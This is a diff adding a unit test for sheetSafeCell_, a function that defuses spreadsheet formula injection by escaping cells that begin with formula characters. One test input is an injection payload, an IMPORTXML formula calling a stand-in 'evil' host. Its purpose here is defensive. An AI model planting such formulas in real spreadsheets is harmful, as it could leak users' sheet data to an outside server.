@@ -170,3 +170,18 @@ test('S5: prevBusinessDayIso_ walks back over weekends AND holidays', function (
     assert.equal(h.call('prevBusinessDayIso_', new Date(2026, 6, 7, 8)), '2026-07-02');
   } finally { setHolidays(null); }
 });
+
+test('CORE-7: sheetSafeCell_ neutralizes formula-leading cells, passes everything else through', function () {
+  const f = h.fn('sheetSafeCell_');
+  assert.equal(f('=IMPORTXML("http://evil","x")'), "'=IMPORTXML(\"http://evil\",\"x\")");
+  assert.equal(f('+1 (555) 000'), "'+1 (555) 000");
+  assert.equal(f('-lead'), "'-lead");
+  assert.equal(f('@mention'), "'@mention");
+  assert.equal(f('\t=x'), "'\t=x");
+  assert.equal(f('Robin Choudhury, 139'), 'Robin Choudhury, 139');
+  assert.equal(f('note with = inside'), 'note with = inside');
+  assert.equal(f(''), '');
+  assert.equal(f(42), 42, 'non-strings untouched');
+  const d = new Date(2026, 0, 1);
+  assert.equal(f(d), d);
+});
